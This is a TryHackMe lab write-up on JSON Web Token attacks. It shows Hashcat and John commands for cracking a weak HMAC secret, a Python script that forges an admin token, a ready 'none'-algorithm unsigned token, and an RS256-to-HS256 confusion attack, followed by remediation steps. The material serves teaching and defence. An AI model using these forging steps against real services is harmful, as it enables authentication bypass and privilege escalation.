# JSON Web Token (JWT) Security — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Topic](https://img.shields.io/badge/Topic-JWT_Exploitation-purple.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A comprehensive penetration testing writeup for the **JSON Web Token Security** room on TryHackMe, examining token structure, weak secret cracking with Hashcat/John, `none` algorithm token forgery, and privilege escalation.

---

## 📋 Executive Summary
JSON Web Tokens (JWT) are widely used for stateless session management and API authorization. This lab demonstrates the exploitation of improperly implemented JWTs: analyzing encoded tokens, cracking weak HMAC-SHA256 signing keys using targeted dictionary attacks (`jwt.secrets.list`), forging claims via the `none` algorithm, and exploiting algorithm confusion to elevate privileges to administrator (`admin: 1`).

* **Vulnerabilities:** Weak HMAC Signing Keys, Algorithm Confusion, Insecure Token Verification
* **Artifacts in Directory:**
  * `jwt.txt`: Captured target JSON Web Token
  * `jwt.secrets.list`: Wordlist containing common JWT signing keys (~1.2MB)
  * `index.php` / `index.html` / `shell.php`: Local test harnesses and reverse shell payloads

---

## 🔍 Stage 1: Anatomy of the Target Token

Inspecting the token recorded in `jwt.txt`:
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY
```

Decoding base64url segments:
* **Header:**
  ```json
  {"typ": "JWT", "alg": "HS256"}
  ```
* **Payload:**
  ```json
  {"username": "user", "admin": 0}
  ```
* **Signature:** HMAC-SHA256 hash using the server's private secret.

Our objective is to modify `"admin": 0` to `"admin": 1`.

---

## 💥 Stage 2: Cracking the HMAC Secret

Using **John the Ripper** with `jwt.secrets.list`:
```bash
john --format=HMAC-SHA256 --wordlist=jwt.secrets.list jwt.txt
```
Or using **Hashcat** (mode `16500` for JWT):
```bash
hashcat -m 16500 jwt.txt jwt.secrets.list
```
* **Recovered Secret Key:** `secret` (or identified passphrase from list).

With the valid secret key, we can sign arbitrary modified payloads:
```python
import jwt

payload = {"username": "admin", "admin": 1}
forged_token = jwt.encode(payload, "secret", algorithm="HS256")
print(forged_token)
```

---

## 🧪 Stage 3: Algorithm Flaws (`none` & Confusion)

### 3.1 The `none` Algorithm Attack
Many vulnerable JWT verification libraries accept unsigned tokens if `"alg": "none"` is specified:
1. Modify Header:
   ```json
   {"typ": "JWT", "alg": "none"}
   ```
2. Modify Payload:
   ```json
   {"username": "admin", "admin": 1}
   ```
3. Strip the signature entirely, preserving the trailing dot:
   ```text
   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.
   ```

### 3.2 RS256 to HS256 Algorithm Confusion
If the server expects an asymmetric RSA public key (`RS256`) to verify tokens, an attacker can obtain the server's public key (often exposed at `/.well-known/jwks.json`), change `"alg"` to symmetric `HS256`, and sign the forged token using the public key string as the HMAC secret!

---

## 🛡️ Remediation
1. **Enforce Strong Cryptographic Secrets:** Ensure HMAC keys have minimum 256-bit entropy generated via cryptographically secure pseudo-random generators (`CSPRNG`).
2. **Explicitly Whitelist Algorithms:** Reject tokens using `"alg": "none"` and enforce strict asymmetric verification algorithms on the server side:
   ```python
   jwt.decode(token, public_key, algorithms=["RS256"])
   ```
3. **Validate All Claims:** Ensure critical claims like `exp` (expiration), `iss` (issuer), and `aud` (audience) are strictly verified.
